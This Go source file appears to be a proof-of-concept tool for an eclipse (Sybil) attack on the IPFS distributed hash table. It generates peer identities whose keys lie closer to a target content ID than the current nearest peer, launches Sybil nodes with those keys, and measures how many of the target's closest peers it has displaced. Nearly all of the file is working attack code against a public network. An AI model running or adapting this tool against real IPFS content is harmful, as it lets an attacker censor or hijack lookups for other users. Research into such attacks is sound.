package main

import (
	// 	"encoding/json"
	"bytes"
	"fmt"

	kspace "github.com/libp2p/go-libp2p-kbucket/keyspace"
	mh "github.com/multiformats/go-multihash"

	// 	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/schollz/progressbar/v3"
	// "encoding/csv"
)

func appendTextToFile(filename string, text string) error {
	f, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND, 0660)
	defer f.Close()
	_, err = f.WriteString(text)

	return err
}

func getCIDWithoutAdding(filename string) []byte {
	// Requires IPFS daemon to be running
	out, err := exec.Command(IPFS_PATH, "add", "-q", "--only-hash", filename).Output()
	if err != nil {
		log.Println("getCIDWithoutAdding() failed!")
		log.Println(err)
		return nil
	}

	return out
}

func addCID(filename string) error {
	// Requires IPFS daemon to be running
	cmd := exec.Command(IPFS_PATH, "add", filename)
	err := cmd.Run()

	return err
}

func getCurrentClosest(CID string) string {
	// Requires IPFS daemon to be running
	cmd := exec.Command(IPFS_PATH, "dht", "query", CID)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		log.Printf("getCurrentClosest() with CID: %s failed", CID)
		fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
		log.Fatal(err)
	}

	return out.String()
}

func killSybils(sybils []*exec.Cmd) {
	fmt.Println("Killing old DHT Sybils...")

	for _, cmd := range sybils {
		if err := cmd.Process.Kill(); err != nil {
			log.Fatal("failed to kill Sybil process: ", err)
		}
		cmd.Wait()
	}
}

func launchSybils(privKeyList []string, pubkeylist []string) []*exec.Cmd {
	//portNumber := 62800
	portNumber := 0
	var sybils []*exec.Cmd
	for i := 0; i < len(privKeyList); i++ {
		fmt.Println("Starting DHT Sybil with ID:", pubkeylist[i])
		portNumberStr := strconv.Itoa(portNumber)
		cmd := exec.Command(SYBIL_NODE_PATH, "--privKey", privKeyList[i], "--port", portNumberStr)
		fmt.Printf("Executing: %s --privKey %s --port %s \n", SYBIL_NODE_PATH, privKeyList[i], portNumberStr)
		cmd.Dir = "./"
		sybils = append(sybils, cmd)
		// open the out file for writing
		outfile, err := os.Create("./out_" + portNumberStr + ".txt")
		if err != nil {
			panic(err)
		}
		defer outfile.Close()
		cmd.Stdout = outfile

		if err := cmd.Start(); err != nil {
			log.Printf("Failed to start Sybil: %v", err)
			os.Exit(1)
		}
		//portNumber = portNumber + 1
	}
	time.Sleep(30 * time.Second)

	return sybils
}

func getPercentEclipsed(targetCID string, sybilIDs []string) float32 {
	// Requires IPFS daemon to be running
	out := string(getCurrentClosest(targetCID)[:])
	if out == "" {
		log.Println("Could not get closest nodes in DHT...")
		os.Exit(1)
	}
	results := strings.Split(out, "\n")
	if out == "" {
		log.Println("Could not get closest nodes in DHT...")
		os.Exit(1)
	}
	numSybils := 0
	for i := 0; i < len(results); i++ {
		for j := 0; j < len(sybilIDs); j++ {
			if results[i] == sybilIDs[j] {
				numSybils += 1
			}
		}
	}
	percentEclipsed := float32(numSybils) / 20 * 100

	return percentEclipsed
}

func attackCID(targetCID string, currentClosest string, peerIdList []string, numberOfSybils int) ([]string, []string, error) {

	id_mh, _ := mh.FromB58String(targetCID)
	targetCIDKey := kspace.XORKeySpace.Key(id_mh)
	fmt.Println("\n####################################################")
	fmt.Printf("CID:%s\n", targetCID)
	fmt.Println("####################################################")
	currentClosestByte, _ := mh.FromB58String(currentClosest)
	currentClosestKey := kspace.XORKeySpace.Key(currentClosestByte)
	minDistance := currentClosestKey.Distance(targetCIDKey)
	var keyList []kspace.Key

	for _, peerId := range peerIdList {
		peerByte, _ := mh.FromB58String(peerId)
		peerKey := kspace.XORKeySpace.Key(peerByte)
		keyList = append(keyList, peerKey)
		distance := peerKey.Distance(targetCIDKey)
		if distance.Cmp(minDistance) == -1 {
			currentClosest = peerId
			minDistance = distance
		}
	}
	fmt.Printf("\n\n")
	fmt.Printf("The closest node is %s with distance %d\n", currentClosest, minDistance)
	fmt.Printf("\n\n")

	var sybilkeylist []kspace.Key
	var sybilcidlist []string
	var pkeylist []string
	fmt.Printf("Generating %d Sybil identities closer to the CID than the currently closest peer\n", numberOfSybils)
	bar := progressbar.Default(int64(numberOfSybils))

	for i := 0; i < numberOfSybils; i++ {
		fmt.Printf("generating new key #%d\n", i)
		sybil, sybilkey, privatekey, err := generateNewKey(currentClosest, targetCIDKey)
		if err != nil {
			return nil, nil, err
		}
		sybilkeylist = append(sybilkeylist, sybilkey)
		sybilcidlist = append(sybilcidlist, sybil)
		pkeylist = append(pkeylist, privatekey)
		bar.Add(1)
	}
	fmt.Println()

	return pkeylist, sybilcidlist, nil
}